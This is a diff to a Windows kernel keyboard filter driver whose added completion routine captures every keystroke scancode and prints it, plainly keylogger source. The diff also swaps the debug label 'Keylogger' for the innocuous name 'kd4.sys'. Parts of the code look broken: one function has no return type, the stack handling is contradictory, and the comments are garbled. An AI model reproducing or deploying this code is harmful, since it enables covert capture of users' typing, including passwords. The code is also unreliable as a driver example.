@@ -32,6 +32,7 @@ DriverEntry (
         DriverObject->MajorFunction[i] = DispatchPassThrough;
     }
 
+	DriverObject->MajorFunction[IRP_MJ_READ] = ReadCompletion;
     DriverObject->MajorFunction [IRP_MJ_CREATE] =
     DriverObject->MajorFunction [IRP_MJ_CLOSE] =        CreateClose;
     DriverObject->MajorFunction [IRP_MJ_PNP] =          PnP;
@@ -105,19 +106,58 @@ AddDevice(
     return status;
 }
 
+
 NTSTATUS
-Complete(
+ReadCompletion(
     IN PDEVICE_OBJECT   DeviceObject,
-    IN PIRP             Irp,
-    IN PVOID            Context
+    IN PIRP             Irp
     )
 {
-   /* PKEVENT  event;
-	event = (PKEVENT) Context;
-    UNREFERENCED_PARAMETER(DeviceObject);
-    UNREFERENCED_PARAMETER(Irp);
-	KeSetEvent(event, 0, FALSE);
-    return STATUS_MORE_PROCESSING_REQUIRED;*/
+	DbgPrint("ReadCompletion");
+    	
+	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);
+
+	// необрабатываемые запросы на наш управл¤ющий девайс(MJ_CREATE..) завершаем с успехом
+	if (IrpSp->DeviceObject == g_pControlDeviceObject)
+	{
+		Irp->IoStatus.Information = 0;
+		Irp->IoStatus.Status = STATUS_SUCCESS;
+		IoCompleteRequest(Irp, IO_NO_INCREMENT);
+
+		return STATUS_SUCCESS;
+	}
+
+	if (!g_bUnload)
+	{
+		switch (IrpSp->MajorFunction)
+		{
+		case IRP_MJ_READ:
+			// чтоб драйвер не выгрузилс¤ до конца CompletionRoutine
+			ObReferenceObject(DeviceObject);
+			InterlockedIncrement((PLONG)&gSysEnters);
+
+			IoCopyCurrentIrpStackLocationToNext(Irp);
+			IoSetCompletionRoutine(Irp, Completion, NULL, TRUE, TRUE, TRUE);
+
+			break;
+		default:
+			IoSkipCurrentIrpStackLocation(Irp);
+		}
+	}
+	else
+	{
+		IoSkipCurrentIrpStackLocation(Irp);
+	}
+	return DispatchPassThrough(DeviceObject, Irp);
+
+}
+
+Completion(
+	IN PDEVICE_OBJECT   DeviceObject,
+	IN PIRP             Irp,
+	IN PVOID            Context
+)
+{
 	DbgPrint("Complete");
 	PKEYBOARD_INPUT_DATA KeyData;
 	ULONG KeyCount;
@@ -130,7 +170,7 @@ Complete(
 
 		for (i = 0; i < KeyCount; i++)
 		{
-			DbgPrint("Keylogger: key SCANCODE:%d ", KeyData[i].MakeCode);
+			DbgPrint("kd4.sys: key SCANCODE:%d ", KeyData[i].MakeCode);
 
 			if (KeyData[i].Flags == KEY_MAKE)
 				DbgPrint("pressed");
@@ -153,7 +193,22 @@ Complete(
 	InterlockedDecrement((PLONG)&gSysEnters);
 
 	return STATUS_SUCCESS;
+}
 
+NTSTATUS
+Complete(
+    IN PDEVICE_OBJECT   DeviceObject,
+    IN PIRP             Irp,
+    IN PVOID            Context
+    )
+{
+	DbgPrint("Complete");
+    PKEVENT  event;
+	event = (PKEVENT) Context;
+    UNREFERENCED_PARAMETER(DeviceObject);
+    UNREFERENCED_PARAMETER(Irp);
+	KeSetEvent(event, 0, FALSE);
+    return STATUS_MORE_PROCESSING_REQUIRED;
 }
 
 NTSTATUS
@@ -221,46 +276,10 @@ DispatchPassThrough(
         IN PIRP Irp
         )
 {
-   /* PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
+	DbgPrint("Disptch");
+    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
     IoSkipCurrentIrpStackLocation(Irp);        
-    return IoCallDriver(((PDEVICE_EXTENSION) DeviceObject->DeviceExtension)->TopOfStack, Irp);*/
-	DbgPrint("DispatchPass");
-	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);
-
-	// необрабатываемые запросы на наш управл¤ющий девайс(MJ_CREATE..) завершаем с успехом
-	if (IrpSp->DeviceObject == g_pControlDeviceObject)
-	{
-		Irp->IoStatus.Information = 0;
-		Irp->IoStatus.Status = STATUS_SUCCESS;
-		IoCompleteRequest(Irp, IO_NO_INCREMENT);
-
-		return STATUS_SUCCESS;
-	}
-
-	if (!g_bUnload)
-	{
-		switch (IrpSp->MajorFunction)
-		{
-		case IRP_MJ_READ:
-			// чтоб драйвер не выгрузилс¤ до конца Complet
-			ObReferenceObject(DeviceObject);
-			InterlockedIncrement((PLONG)&gSysEnters);
-
-			IoCopyCurrentIrpStackLocationToNext(Irp);
-			IoSetCompletionRoutine(Irp, Complete, NULL, TRUE, TRUE, TRUE);
-
-			break;
-		default:
-			IoSkipCurrentIrpStackLocation(Irp);
-		}
-	}
-	else
-	{
-		IoSkipCurrentIrpStackLocation(Irp);
-	}
-
-	//return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->PDO, Irp);
-	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->TopOfStack, Irp);
+    return IoCallDriver(((PDEVICE_EXTENSION) DeviceObject->DeviceExtension)->TopOfStack, Irp);
 }           
 
 NTSTATUS
